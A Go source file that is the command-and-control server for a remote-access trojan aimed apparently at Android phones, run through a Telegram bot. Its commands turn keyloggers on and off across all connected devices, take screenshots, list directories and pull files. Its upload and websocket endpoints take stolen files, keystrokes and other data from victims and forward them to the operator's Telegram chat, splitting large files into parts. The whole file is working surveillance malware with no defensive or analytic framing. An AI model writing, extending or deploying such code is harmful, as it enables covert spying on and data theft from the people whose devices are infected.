package main

import (
	"bytes"
	"context"
	"crypto/rand"
	"encoding/base64"
	"encoding/json"
	"fmt"
	"io"
	"log"
	"math"
	"net/http"
	"os"
	"os/signal"
	"strconv"
	"strings"
	"sync"
	"syscall"
	"time"

	"github.com/go-telegram/bot"
	"github.com/go-telegram/bot/models"
	"github.com/gorilla/websocket"
)

var (
	token     = os.Getenv("TELEGRAM_TOKEN")
	chatIDStr = os.Getenv("CHAT_ID")
	clients   = make(map[*websocket.Conn]string) // conn -> device_name
	deviceMu  sync.RWMutex
	upgrader  = websocket.Upgrader{CheckOrigin: func(r *http.Request) bool { return true }}
)

var chatID int64

const maxPartSize = 50 * 1024 * 1024 // 50MB per Telegram document

func main() {
	var err error
	chatID, err = strconv.ParseInt(chatIDStr, 10, 64)
	if err != nil {
		log.Fatal("Invalid CHAT_ID:", err)
	}

	ctx, cancel := signal.NotifyContext(context.Background(), os.Interrupt, syscall.SIGTERM)
	defer cancel()

	go startBot(ctx)

	http.HandleFunc("/", rootHandler)
	http.HandleFunc("/upload", uploadHandler)
	http.HandleFunc("/upload_chunked", chunkedHandler)
	http.HandleFunc("/ws", wsHandler)

	port := os.Getenv("PORT")
	if port == "" {
		port = "10000"
	}
	log.Printf("C2 live → https://%s.onrender.com", os.Getenv("RENDER_SERVICE_NAME"))
	log.Fatal(http.ListenAndServe(":"+port, nil))
}

func startBot(ctx context.Context) {
	b, err := bot.New(token)
	if err != nil {
		log.Fatal("Bot init failed:", err)
	}

	b.RegisterHandler(bot.HandlerTypeMessageText, "", bot.MatchTypePrefix, func(ctx context.Context, b *bot.Bot, update *models.Update) {
		if update.Message == nil || update.Message.Chat.ID != chatID {
			return
		}
		msg := strings.TrimSpace(strings.ToLower(update.Message.Text))
		parts := strings.Fields(msg)
		if len(parts) == 0 {
			return
		}
		cmd := parts[0]
		args := strings.Join(parts[1:], " ")

		switch cmd {
		case "/start":
			listDevices(b, ctx)

		case "/on":
			broadcastJSON(map[string]any{"command": "ON"})
			b.SendMessage(ctx, &bot.SendMessageParams{ChatID: chatID, Text: "Keylogger ENABLED on all devices"})

		case "/off":
			broadcastJSON(map[string]any{"command": "OFF"})
			b.SendMessage(ctx, &bot.SendMessageParams{ChatID: chatID, Text: "Keylogger DISABLED on all devices"})

		case "/screenshot":
			broadcastJSON(map[string]any{"command": "screenshot"})
			b.SendMessage(ctx, &bot.SendMessageParams{ChatID: chatID, Text: "Screenshot command sent"})

		case "/ls", "/dir":
			path := "/storage/emulated/0"
			if args != "" {
				path = args
			}
			reqID := genID()
			broadcastJSON(map[string]any{
				"command":     "file_list",
				"path":        path,
				"request_id":  reqID,
			})
			b.SendMessage(ctx, &bot.SendMessageParams{ChatID: chatID, Text: fmt.Sprintf("Listing: %s", path)})

		case "/download", "/get":
			path := args
			if path == "" {
				b.SendMessage(ctx, &bot.SendMessageParams{ChatID: chatID, Text: "Usage: /download /path/to/file"})
				return
			}
			broadcastJSON(map[string]any{
				"command":   "send_file",
				"file_path": path,
			})
			b.SendMessage(ctx, &bot.SendMessageParams{ChatID: chatID, Text: fmt.Sprintf("Downloading: %s", path)})

		case "/help":
			help := `Available commands:
/start - Show devices
/on - Enable keylogger
/off - Disable keylogger
/screenshot - Take screenshot
/ls [path] - List directory
/download <path> - Download file
/help - This menu`
			b.SendMessage(ctx, &bot.SendMessageParams{ChatID: chatID, Text: help})

		default:
			b.SendMessage(ctx, &bot.SendMessageParams{ChatID: chatID, Text: "Unknown command. Type /help"})
		}
	})

	b.Start(ctx)
}

func listDevices(b *bot.Bot, ctx context.Context) {
	deviceMu.RLock()
	if len(clients) == 0 {
		b.SendMessage(ctx, &bot.SendMessageParams{ChatID: chatID, Text: "No devices connected"})
		deviceMu.RUnlock()
		return
	}
	var names []string
	for _, name := range clients {
		names = append(names, name)
	}
	deviceMu.RUnlock()
	b.SendMessage(ctx, &bot.SendMessageParams{ChatID: chatID, Text: fmt.Sprintf("Connected devices (%d):\n• %s", len(names), strings.Join(names, "\n• "))})
}

func broadcastJSON(data map[string]any) {
	payload, _ := json.Marshal(data)
	deviceMu.RLock()
	defer deviceMu.RUnlock()
	log.Printf("Broadcasting JSON → %s", string(payload))
	for conn := range clients {
		if err := conn.WriteMessage(websocket.TextMessage, payload); err != nil {
			log.Printf("WS write error: %v", err)
			delete(clients, conn)
		}
	}
}

func rootHandler(w http.ResponseWriter, r *http.Request) {
	json.NewEncoder(w).Encode(map[string]any{
		"status":            "running",
		"connected_devices": len(clients),
	})
}

func uploadHandler(w http.ResponseWriter, r *http.Request) {
	r.ParseMultipartForm(50 << 20)
	file, header, err := r.FormFile("file")
	if err != nil {
		http.Error(w, "No file", 400)
		return
	}
	defer file.Close()
	data, _ := io.ReadAll(file)
	sendFileToTelegram(header.Filename, data, fmt.Sprintf("File: %s (%d KB)", header.Filename, len(data)/1024))
	w.Write([]byte("OK"))
}

func chunkedHandler(w http.ResponseWriter, r *http.Request) {
	defer r.Body.Close()
	data, _ := io.ReadAll(r.Body)
	if len(data) < 100 {
		sendMsg(fmt.Sprintf("Data received: %d bytes\nPreview: %s", len(data), string(data)))
	} else {
		sendFileToTelegram("chunked_data.bin", data, fmt.Sprintf("Chunked data: %d KB", len(data)/1024))
	}
	w.Write([]byte("OK"))
}

func wsHandler(w http.ResponseWriter, r *http.Request) {
	conn, _ := upgrader.Upgrade(w, r, nil)
	defer conn.Close()

	// Wait for device name
	_, msg, _ := conn.ReadMessage()
	deviceName := strings.TrimSpace(string(msg))
	if deviceName == "" {
		deviceName = "Unknown Device"
	}
	log.Printf("RAT connected: %s", deviceName)

	deviceMu.Lock()
	clients[conn] = deviceName
	deviceMu.Unlock()

	defer func() {
		deviceMu.Lock()
		delete(clients, conn)
		deviceMu.Unlock()
		log.Printf("RAT disconnected: %s", deviceName)
	}()

	for {
		_, msg, err := conn.ReadMessage()
		if err != nil {
			break
		}
		text := string(msg)
		log.Printf("RAT → %s: %s", deviceName, text)
		sendMsg(fmt.Sprintf("[%s]\n%s", deviceName, text))
	}
}

func sendFileToTelegram(filename string, data []byte, caption string) {
	b, _ := bot.New(token)

	if len(data) <= maxPartSize {
		_, err := b.SendDocument(context.Background(), &bot.SendDocumentParams{
			ChatID:   chatID,
			Document: &models.InputFileUpload{Filename: filename, Data: bytes.NewReader(data)},
			Caption:  caption,
		})
		if err != nil {
			log.Printf("Telegram send failed: %v", err)
		}
		return
	}

	// Split large files
	numParts := int(math.Ceil(float64(len(data)) / float64(maxPartSize)))
	for i := 0; i < numParts; i++ {
		start := i * maxPartSize
		end := start + maxPartSize
		if end > len(data) {
			end = len(data)
		}
		part := data[start:end]
		partName := fmt.Sprintf("%s.part%d", filename, i+1)

		b.SendDocument(context.Background(), &bot.SendDocumentParams{
			ChatID:   chatID,
			Document: &models.InputFileUpload{Filename: partName, Data: bytes.NewReader(part)},
			Caption:  fmt.Sprintf("%s\nPart %d/%d", caption, i+1, numParts),
		})
		time.Sleep(200 * time.Millisecond)
	}
}

func sendMsg(text string) {
	b, _ := bot.New(token)
	b.SendMessage(context.Background(), &bot.SendMessageParams{
		ChatID: chatID,
		Text:   text,
	})
}

func genID() string {
	b := make([]byte, 8)
	rand.Read(b)
	return base64.URLEncoding.EncodeToString(b)[:11]
}